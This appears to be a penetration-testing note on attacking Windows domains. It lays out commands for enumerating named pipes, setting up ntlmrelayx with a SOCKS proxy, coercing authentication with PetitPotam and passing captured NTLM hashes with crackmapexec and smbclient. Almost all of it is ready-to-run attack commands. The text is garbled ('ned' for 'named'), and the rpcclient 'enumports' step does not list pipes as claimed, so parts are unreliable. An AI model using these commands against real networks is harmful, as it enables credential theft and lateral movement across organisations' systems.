**Pentest Note: Enumerating ned Pipes, NTLM Relay, PetitPotam Attack, and Proxy Setup**

---
Identify vulnerable ned pipes, setting up NTLM relay attacks with a SOCKS proxy, executing the PetitPotam attack, and leveraging the captured NTLM hashes.

The SOCKS proxy created by `ntlmrelayx` enables further exploitation of the compromised environment, allowing you to route traffic through various tools like Nmap, CrackMapExec, and SMBClient. 

### Step 1: Enumerating ned Pipes on Remote Machines (Windows and Kali)

Identifying vulnerable ned pipes is crucial before executing attacks like PetitPotam. Below are methods for both Windows and Kali to enumerate ned pipes on a remote machine:

#### Method 1: Using `SharpPipeSearch` (Windows, C# Tool)

- **Command (Windows):**
  ```bash
  SharpPipeSearch.exe -target <target_ip>
  ```

  - This tool enumerates ned pipes on the target system and displays potential targets.

#### Method 2: Using `pipe-auditor` (Windows, PowerShell Script)

- **Command (Windows):**
  ```powershell
  .\pipe-auditor.ps1 -target <target_ip>
  ```

  - This PowerShell script audits and lists available ned pipes on the remote machine.

#### Method 3: Using PowerShell and WMI (Windows)

- **Command (Windows):**
  ```powershell
  Get-WmiObject -nespace "root\cimv2" -Class Win32_Pipe -Computerne <target_ip>
  ```

  - This command uses WMI to query and list ned pipes available on the specified remote machine.

#### Method 4: Using `rpcclient` (Kali, Linux/Unix)

- **Command (Kali):**
  ```bash
  rpcclient -U "" -N <target_ip> -c 'enumports'
  ```

  - This command uses the `rpcclient` tool to enumerate ned pipes on the target system without requiring credentials (`-U "" -N`).

### Step 2: Setting Up NTLM Relay with `ntlmrelayx` and SOCKS Proxy (Kali)

Use `ntlmrelayx.py` on Kali to relay NTLM authentication to a target system. The `-socks` option sets up a SOCKS proxy, which can be leveraged for further exploitation.

- **Command (Kali):**
  ```bash
  python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf targets.txt -debug -socks
  ```

  - `-tf targets.txt`: File containing the list of target IPs for relaying authentication.
  - `-debug`: Enables detailed logging.
  - `-socks`: Sets up a local SOCKS proxy on port 1080, allowing you to tunnel further attacks through the compromised system.

#### Using the SOCKS Proxy for Further Attacks

After setting up the SOCKS proxy with `ntlmrelayx`, you can route additional tools through it to interact with the compromised environment.

1. **Configuring ProxyChains (Kali):**

   - Modify your `proxychains.conf` file to route traffic through the SOCKS proxy.

   - **Example Configuration:**
     ```bash
     [ProxyList]
     socks5 127.0.0.1 1080
     ```

     Here, `127.0.0.1` is the local loopback address, and `1080` is the default SOCKS proxy port.

2. **Using Tools Through the SOCKS Proxy (Kali):**

   - **Example Commands:**
     ```bash
     proxychains nmap -sT -Pn -p 445 <target_ip>
     proxychains crackmapexec smb <target_ip> -u <user> -H <captured_hash>
     proxychains smbclient.py -U <user>%<captured_hash> //target_ip/share
     ```

   - These commands will now route through the SOCKS proxy, effectively interacting with the target systems as if they were in the same internal network.

### Step 3: Executing PetitPotam Attack (Kali)

The PetitPotam attack is used to coerce a machine into authenticating with your NTLM relay server. This attack primarily targets the `\pipe\lsarpc` ned pipe.

- **Primary Pipe for PetitPotam:**
  - **`lsarpc`**: The main target for PetitPotam attacks.

  - **Example Command for PetitPotam (Kali):**
    ```bash
    python3 PetitPotam.py -u "" -p '' -d top.domain -dc-ip 1.2.1.4 -pipe lsarpc
    ```

    - `-u "" -p ''`: No credentials required; empty userne and password.
    - `-pipe lsarpc`: Specifies the ned pipe targeted by PetitPotam.

#### List of ned Pipes Potentially Vulnerable to PetitPotam

- **`lsarpc`**: Primary target for PetitPotam.
- **`samr`**: Security Account Manager Remote Protocol.
- **`netlogon`**: Used for secure channel communication.
- **`browser`**: Used for browser service communication.
- **`spoolss`**: Used for printer spooler services.
- **`atsvc`**: Used for task scheduler service.

### Step 4: Relay the NTLM Hash (Kali)

Using the `ntlmrelayx.py` setup from Step 2, the NTLM hash captured from the coerced authentication can be relayed to your target systems.

- **Relay the NTLM Hash (Kali):**
  ```bash
  proxychains crackmapexec smb <target_ip> -u <user> -H <captured_hash>
  ```

  - The captured NTLM hash can be used for actions like accessing SMB shares, executing commands, or further network exploitation.


